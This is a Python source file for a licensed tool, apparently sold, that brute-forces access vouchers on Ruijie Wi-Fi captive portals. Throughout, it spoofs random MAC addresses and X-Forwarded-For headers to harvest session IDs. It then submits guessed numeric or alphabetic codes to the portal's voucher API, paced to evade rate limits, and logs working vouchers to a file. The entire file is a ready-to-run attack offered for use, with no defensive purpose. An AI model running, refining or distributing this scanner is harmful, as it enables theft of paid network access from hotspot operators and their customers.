#!/usr/bin/env python3
"""
Ruijie Voucher Scanner v18.4 - SKY BLUE EDITION (DUAL COMPACT UI)
- Premium Animated UI Design
- Dual Code Display (Left & Right simultaneous)
- Slow & Steady to bypass server rate limits
"""

import os
import sys
import json
import asyncio
import aiohttp
import re
import time
import socket
import requests
import urllib3
import random
import string
import hmac
import hashlib
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console, Group
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.box import HEAVY, ROUNDED, DOUBLE, MINIMAL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# ⚙️ SLOW & STEADY TUNING
# ==========================================
CONCURRENCY = 2           # ကုဒ် ၂ ခု တစ်ပြိုင်နက်တည်း စစ်မယ်
TIMEOUT = 8
SID_POOL_MAX = 100
SID_FETCHER_COUNT = 5
SID_FETCH_SLEEP = 0.5
DIRECT_TIMEOUT = 5
WORKER_SID_TIMEOUT = 2.0
REQUEST_DELAY = 0.5       # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း 0.5 စက္ကန့် နားမယ်

console = Console()

OUI_POOL = [
    "64:CC:2E", "78:11:DC", "50:8F:4C", "8C:AA:B5", "9C:99:A0",
    "8C:77:12", "34:23:BA", "C0:BD:D1", "BC:14:85", "38:AA:3C",
    "3C:2E:F9", "F0:18:98", "8C:85:90", "BC:92:6B", "D0:81:7A",
]

SECRET_KEY = b"RuijieScanner_Secret_2024!@#"
LICENSE_FILE = ".rj_license"

def check_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                data = json.load(f)
                key = data.get("key", "")
                code, exp_str, sig = key.split("-")
                expiry = int(exp_str)
                expected_sig = hmac.new(SECRET_KEY, f"{code}-{exp_str}".encode(), hashlib.sha256).hexdigest()[:10].upper()

                if hmac.compare_digest(sig, expected_sig):
                    if time.time() < expiry:
                        return True
        except Exception:
            pass

    console.print(Panel(Align.center(Text.assemble(("🔒 ", "bold red"), ("ACTIVATION REQUIRED", "bold white on red"))), border_style="red", box=DOUBLE))
    user_key = input("[bold cyan]>> Enter your Key: [/bold cyan]").strip()

    try:
        code, exp_str, sig = user_key.split("-")
        expiry = int(exp_str)
        expected_sig = hmac.new(SECRET_KEY, f"{code}-{expiry}".encode(), hashlib.sha256).hexdigest()[:10].upper()

        if hmac.compare_digest(sig, expected_sig):
            if time.time() < expiry:
                with open(LICENSE_FILE, "w") as f:
                    json.dump({"key": user_key, "expiry": expiry}, f)
                return True
    except Exception:
        pass

    console.print("[bold red][-] Invalid or Expired Key![/bold red]")
    return False

def parse_remaining_time(result):
    if not isinstance(result, dict): return None, None
    def _find_time_value(obj, depth=0):
        if depth > 5 or obj is None: return None, None
        if isinstance(obj, dict):
            keys = ['remainingTime', 'remainTime', 'leftTime', 'timeLeft', 'surplusTime', 'validTime', 'duration']
            for k in keys:
                if k in obj: return k, obj[k]
            for v in obj.values():
                fk, fv = _find_time_value(v, depth + 1)
                if fk is not None: return fk, fv
        elif isinstance(obj, list):
            for item in obj:
                fk, fv = _find_time_value(item, depth + 1)
                if fk is not None: return fk, fv
        return None, None
    
    key, val = _find_time_value(result)
    if key is None or val is None: return None, None
    
    try:
        seconds = int(float(val))
        if seconds > 10**9: return "Expired/Invalid", val
        if seconds <= 0: return "expired", val
        d, rem = divmod(seconds, 86400)
        h, rem = divmod(rem, 3600)
        m, s = divmod(rem, 60)
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m: parts.append(f"{m}m")
        return " ".join(parts), val
    except:
        return str(val), val

def fmt_elapsed(seconds):
    seconds = int(seconds)
    h = seconds // 3600; m = (seconds % 3600) // 60; s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        parts = ip.split('.'); parts[-1] = '1'
        return '.'.join(parts)
    except Exception: return "192.168.1.1"

def auto_detect_portal():
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'})
    try:
        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=4)
        if "ruijienetworks" in r.url: return r.url
    except Exception: pass
    for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1"]:
        try:
            res = session.get(f"http://{gw}", timeout=3, allow_redirects=True)
            if "ruijienetworks" in res.url: return res.url
        except Exception: pass
    return None
class VoucherScanner:
    def __init__(self):
        self.mode = "num"
        self.portal_url = ""
        self.length = 6
        self.sid_pool = asyncio.Queue(maxsize=SID_POOL_MAX)
        self.voucher_queue = asyncio.Queue()

        self._stop = False
        self._display_active = False
        self._live = None

        self._state = {
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'elapsed': '00:00:00', 'found': [], 'valid': [], 'dead': [],
            'status': 'Initializing...', 
            'current_code_1': '----', 'current_code_2': '----',
            'sid_pool': 0, 'workers': 0,
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.1",
            "mac": "00:00:00:00:00:00", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def _gen_mac(self):
        oui = random.choice(OUI_POOL)
        return f"{oui}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}".lower()

    def _gen_ip(self): return f"192.168.110.{random.randint(2, 254)}"

    def _host(self):
        pu = self.portal_url or str(self.params.get("url", ""))
        if "portal-mm" in pu: return "portal-mm-as.ruijienetworks.com"
        return "portal-as.ruijienetworks.com"

    def apply_params_from_url(self, url):
        self.portal_url = url
        parsed = urlparse(url); query = parse_qs(parsed.query)
        for k in ['gw_id', 'gw_sn', 'gw_address', 'gw_port', 'ip', 'mac', 'slot_num', 'nasip', 'ssid']:
            if k in query: self.params[k] = query[k][0]

    def generate_voucher(self):
        if self.mode == "num": return str(random.randint(0, 10**self.length - 1)).zfill(self.length)
        elif self.mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=self.length))
        elif self.mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=self.length))
        return "0" * self.length

    # ==========================================
    # 🎨 COMPACT UI LAYOUT
    # ==========================================
    def make_layout(self):
        s = self._state
        layout = Layout()
        
        # UI အပိုင်းတွေကို ပိုပြီး ကျစ်လျစ်အောင် လျှော့ချထားတယ်
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="stats", size=3),
            Layout(name="progress", size=3),
            Layout(name="codes", size=3),
            Layout(name="hits", ratio=1),
        )

        # 1. Header
        header_text = Text("☁️ SKY BLUE SCANNER v18.4 - DUAL ☁️", style="bold white on sky_blue1", justify="center")
        layout["header"].update(Panel(header_text, border_style="sky_blue1", box=ROUNDED))

        # 2. Stats
        speed = s['speed']
        speed_style = "bold green" if speed >= 100 else "bold red"
        stats_table = Table.grid(padding=0, expand=True)
        for _ in range(4): stats_table.add_column(ratio=1)
        stats_table.add_row(
            Text.assemble(("⚡ ", ""), (f"{speed}/min", speed_style), justify="center"),
            Text.assemble(("📊 ", ""), (f"{s['checked']}", "bold cyan"), justify="center"),
            Text.assemble(("🎯 ", ""), (f"{len(s['found']) + len(s['valid'])}", "bold green"), justify="center"),
            Text.assemble(("⏱️ ", ""), (s['elapsed'], "bold magenta"), justify="center"),
        )
        layout["stats"].update(Panel(stats_table, border_style="dim", box=MINIMAL))

        # 3. Progress
        pct = s['percentage']
        progress_text = Text.assemble(
            (f"[{pct:.1f}%] ", "bold cyan"), 
            (f"Status: {s['status']} | Pool: {s['sid_pool']}", "dim")
        )
        layout["progress"].update(Panel(progress_text, border_style="dim", box=MINIMAL))

        # 4. Codes (ဘေးချင်းယှဉ် ကုဒ် ၂ ခု)
        codes_table = Table.grid(padding=(0, 1), expand=True)
        codes_table.add_column(ratio=1, justify="center")
        codes_table.add_column(ratio=1, justify="center")
        codes_table.add_row(
            Text.assemble(("1️⃣ ", ""), (s['current_code_1'], "bold white on blue")),
            Text.assemble(("2️⃣ ", ""), (s['current_code_2'], "bold white on blue")),
        )
        layout["codes"].update(Panel(codes_table, title="[dim]Scanning Codes[/dim]", border_style="cyan", box=ROUNDED))

        # 5. Hits Dashboard
        hits_table = Table(show_header=True, header_style="bold white on sky_blue1", expand=True, box=MINIMAL)
        hits_table.add_column("TYPE", width=8, justify="center")
        hits_table.add_column("VOUCHER", justify="center")
        hits_table.add_column("TIME LEFT", width=12, justify="center")

        all_hits = []
        for v, t, _url, tl in s['found']: all_hits.append(("FOUND", v, tl))
        for v, t, tl in s['valid']: all_hits.append(("VALID", v, tl))
        
        for kind, v, tl in all_hits[-15:]: # နေရာပိုရအောင် ၁၅ ခုအထိ ပြမယ်
            style = "bold green" if kind == "FOUND" else "bold cyan"
            hits_table.add_row(f"[{style}]{kind}[/]", v, tl or "-")

        if not all_hits:
            hits_table.add_row("", "[dim italic]No hits yet...[/dim italic]", "")
            
        layout["hits"].update(Panel(hits_table, title="🎯 HITS DASHBOARD", border_style="green", box=ROUNDED))
        return layout

    async def _ui_loop(self):
        while self._display_active:
            try: self._live.update(self.make_layout())
            except Exception: pass
            await asyncio.sleep(0.1)

    def _record_hit(self, voucher, kind, logon_url="", tl=""):
        clock = datetime.now().strftime("%H:%M:%S")
        try:
            with open("found_ruijie.txt", "a") as f:
                f.write(f"[{kind}] {voucher} {tl}\n")
        except: pass
        if kind == "FOUND": self._state['found'].append((voucher, clock, logon_url, tl))
        elif kind == "VALID": self._state['valid'].append((voucher, clock, tl))
        elif kind in ("STA_LIMIT", "EXPIRED"): self._state['dead'].append((voucher, clock, kind))

    async def sid_fetcher(self, session):
        while not self._stop:
            try:
                if self.sid_pool.full():
                    await asyncio.sleep(1)
                    continue

                mac = self._gen_mac()
                ip = self._gen_ip()

                headers = {
                    'User-Agent': f'Mozilla/5.0 (Linux; Android 12) Dragon-{mac}',
                    'Client-Mac': mac,
                    'X-Forwarded-For': ip,
                }

                temp_params = self.params.copy()
                temp_params['mac'] = mac
                temp_params['ip'] = ip
                params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
                url = f"https://{self._host()}/api/auth/wifidog?{params_str}"

                try:
                    async with session.get(url, headers=headers, timeout=DIRECT_TIMEOUT, allow_redirects=False, ssl=False) as resp:
                        loc = resp.headers.get('Location', '')
                        if loc:
                            q = parse_qs(urlparse(loc).query)
                            sid = q.get('sessionId', [None])[0]
                            if sid:
                                await self.sid_pool.put({
                                    'sid': sid, 'mac': mac, 'ip': ip, 'proxy': None,
                                    'sign': q.get('sign', [None])[0], 'ts': q.get('timestamp', [None])[0], 'used': 0
                                })
                                self._state['sid_pool'] = self.sid_pool.qsize()
                except: pass

            except Exception:
                pass
            await asyncio.sleep(SID_FETCH_SLEEP)

    # ==========================================
    # 🔥 DUAL SCAN WORKER (တစ်ခုနဲ့တစ်ခု မရောအောင် ခွဲထားတယ်)
    # ==========================================
    async def scan_worker(self, session, worker_id):
        while not self._stop:
            try:
                try:
                    sid_data = await asyncio.wait_for(self.sid_pool.get(), timeout=WORKER_SID_TIMEOUT)
                except asyncio.TimeoutError:
                    self._state['status'] = "⏳ Waiting for SID..."
                    continue

                try:
                    voucher = await asyncio.wait_for(self.voucher_queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    await self.sid_pool.put(sid_data)
                    continue

                self._state['workers'] += 1
                self._state['status'] = "Scanning..."

                # Worker 1 က Code 1 မှာ၊ Worker 2 က Code 2 မှာ သီးသန့်ပြမယ်
                if worker_id == 1:
                    self._state['current_code_1'] = voucher
                else:
                    self._state['current_code_2'] = voucher

                url = f"https://{self._host()}/api/auth/voucher/?lang=en_US"
                headers = {
                    "content-type": "application/json",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12)",
                    "referer": f"https://{self._host()}/download/static/maccauth/src/index.html?sessionId={sid_data['sid']}",
                    "Client-Mac": sid_data['mac'],
                    "X-Forwarded-For": sid_data['ip'],
                }
                payload = {"accessCode": voucher, "sessionId": sid_data['sid'], "apiVersion": 1}
                if sid_data['sign']: payload["sign"] = sid_data['sign']
                if sid_data['ts']: payload["timestamp"] = sid_data['ts']

                status = 'INVALID'
                tl = ""
                logon = ""

                try:
                    async with session.post(url, json=payload, headers=headers, proxy=None, ssl=False, timeout=TIMEOUT, allow_redirects=True) as resp:
                        text = await resp.text()
                        
                        try: result = json.loads(text)
                        except: result = {}
                        msg = str(result.get("message", "")).lower()

                        if "sta limit" in msg or "station limit" in msg: status = 'STA_LIMIT'
                        elif "expired" in msg: status = 'EXPIRED'
                        else:
                            success = False
                            if isinstance(result, dict):
                                if result.get("success") is True: success = True
                                if not success and isinstance(result.get("result"), dict):
                                    logon = result["result"].get("logonUrl") or result["result"].get("logon_url")
                                    if logon: success = True
                                if not success and str(result.get("result")) == "0": success = True

                            if success:
                                status = 'FOUND' if logon else 'VALID'
                                tl = parse_remaining_time(result)[0] or ""

                except Exception:
                    status = 'DEAD_SID'

                self._state['checked'] += 1

                if status in ('DEAD_SID', 'INVALID'):
                    if status == 'INVALID':
                        sid_data['used'] += 1
                        if sid_data['used'] < 10: await self.sid_pool.put(sid_data)
                else:
                    if not self.sid_pool.full(): await self.sid_pool.put(sid_data)
                    self._record_hit(voucher, status, logon, tl)

                if not self._stop:
                    await self.voucher_queue.put(self.generate_voucher())

                # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း ခဏနားမယ်
                await asyncio.sleep(REQUEST_DELAY)

            except asyncio.CancelledError:
                break
            except Exception:
                pass
            finally:
                self._state['workers'] -= 1
                self._state['sid_pool'] = self.sid_pool.qsize()

    async def run(self, session, total_codes):
        self._state['total'] = total_codes
        self._state['status'] = "Starting..."

        for _ in range(CONCURRENCY * 2):
            self.voucher_queue.put_nowait(self.generate_voucher())

        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=4, screen=True)
        self._live.start()
        ui_task = asyncio.create_task(self._ui_loop())

        sid_tasks = [asyncio.create_task(self.sid_fetcher(session)) for _ in range(SID_FETCHER_COUNT)]
        
        # Worker 1 နဲ့ Worker 2 ကို သီးသန့် ခွဲထားတယ်
        scan_tasks = [
            asyncio.create_task(self.scan_worker(session, worker_id=1)),
            asyncio.create_task(self.scan_worker(session, worker_id=2))
        ]

        start_time = time.time()
        while self._state['checked'] < total_codes and not self._stop:
            elapsed = time.time() - start_time
            self._state['speed'] = int(self._state['checked'] / elapsed * 60) if elapsed > 0 else 0
            self._state['percentage'] = (self._state['checked'] / total_codes) * 100
            self._state['elapsed'] = fmt_elapsed(elapsed)
            await asyncio.sleep(1)

        self._stop = True
        for t in sid_tasks + scan_tasks: t.cancel()

        self._display_active = False
        ui_task.cancel()
        self._live.stop()
        console.print(f"\n[bold green]COMPLETED: {self._state['checked']} codes in {self._state['elapsed']}[/bold green]")

async def main():
    clear_screen()
    if not check_license():
        input("\n[red]Press Enter to exit...[/red]")
        sys.exit(1)

    scanner = VoucherScanner()
    portal_url = auto_detect_portal()

    if portal_url:
        scanner.apply_params_from_url(portal_url)
        console.print("[bold green][+][/bold green] URL fetched successfully!")
    else:
        url_input = input("[yellow]>> Paste URL manually: [/yellow]").strip()
        if not url_input: return
        scanner.apply_params_from_url(url_input)

    async with aiohttp.ClientSession() as session:
        console.print(Panel(Text("Choose Scan Type:\n 1. NUM\n 2. ENG\n 3. MIX", style="cyan"), border_style="cyan", box=HEAVY))
        scan_type = input("[yellow]>> [/yellow]").strip()
        scanner.mode = {"1": "num", "2": "eng", "3": "mix"}.get(scan_type, "num")

        lc = input("[yellow]>> Length (6/7/8) [6]: [/yellow]").strip()
        scanner.length = int(lc) if lc in ('7', '8') else 6

        total = 100000 if scanner.length == 6 else 500000
        await scanner.run(session, total)

    input("[blue][*][/blue] Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
